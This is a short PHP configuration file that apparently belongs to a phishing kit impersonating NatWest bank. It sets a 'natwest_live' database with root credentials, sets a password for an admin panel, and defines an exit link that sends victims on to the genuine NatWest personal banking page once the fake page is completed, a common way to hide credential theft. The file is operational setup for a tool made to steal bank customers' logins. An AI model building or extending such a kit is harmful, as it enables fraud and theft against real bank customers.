<?php
error_reporting(0);
$servername = "localhost";
$database = "natwest_live";
$username = "root";
$password = "123456-abcdef";

// admin panel password
$admin_panel_password = "1234"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obviously]
$exit_link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiC--Cn9KfrAhWC3YUKHfmhBEMQFjAAegQIARAC&url=https%3A%2F%2Fpersonal.natwest.com%2Fpersonal.html&usg=AOvVaw2JgD2A_lRG56eitkFyGTVA";


?>